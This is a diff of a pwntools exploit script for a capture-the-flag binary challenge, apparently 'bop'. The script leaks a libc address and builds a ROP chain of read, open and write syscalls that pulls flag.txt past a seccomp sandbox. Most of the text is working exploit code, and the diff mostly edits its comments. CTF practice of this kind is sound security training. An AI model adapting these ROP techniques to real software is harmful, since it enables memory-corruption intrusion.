@@ -35,14 +35,14 @@ payload += p64(printf_plt)
 payload += p64(ret)
 payload += p64(main)
 
-p.sendlineafter('Do you bop?', payload)
-p.recvuntil(' ')
+p.sendlineafter('bop?', payload)
+p.recvuntil(' ') # NEEDTO: find out why this happens and how to ID it
 
-# LIBC & LIBSECCOMP leaks
-# ? Identify 
+
+# NEEDTO: ID how to know how much data to read before saving leak.
+# LIBC leaks
 libc_gets_leak = int(p.recvuntil('\x7f')[::-1].encode('hex'),16)
 libc_read = libc_gets_leak + 566864
-libc_open = libc_gets_leak + 566128
 libc_pop_rsi = libc_gets_leak - 383313
 libc_pop_rax = libc_gets_leak - 317436
 libc_pop_rdx = libc_gets_leak + 783138
@@ -52,7 +52,8 @@ flag = 0x4040A0
 print "libc gets() leak: ", hex(libc_gets_leak)
 print "flag address: ", hex(flag)
 
-# read "flag.txt" into RW memory address
+# read literal string "flag.txt" into RW memory address for open() SYSCALL
+# read(0, [flag.txt memory address], 0x10);
 payload = "B" * 40
 payload += p64(pop_rdi)
 payload += p64(0x0)
@@ -64,7 +65,7 @@ payload += p64(ret)
 payload += p64(libc_read)
 
 
-# open('[flag.txt memory address]', 4)
+# open([flag.txt memory address], 4)
 payload += p64(pop_rdi)
 payload += p64(flag)
 payload += p64(libc_pop_rsi)
@@ -99,13 +100,12 @@ payload += p64(0x1)
 payload += p64(libc_syscall)
 payload += p64(ret)
 
-# After sending payload, we send 'flag.txt\0' to 1st read() syscall.
-# Avoid going back to [0x4012f9](main) to minimize stack
+# After sending 2nd payload, we send 'flag.txt\0' to 1st read() syscall.
+# Avoided going back to [0x4012f9](main) to minimize stack
 # movement. Going back to main() worked fine until errors
-# on the 2nd read SYSCALL in printf() after open SYSCALL.
+# on the 2nd READ SYSCALL in printf() after OPEN SYSCALL.
 
 pause()
 p.sendlineafter('bop?', payload)
-p.sendline('flag.txt\0')    
+p.sendline('flag.txt\0')    # send to 1st READ SYSCALL
 p.interactive()
-
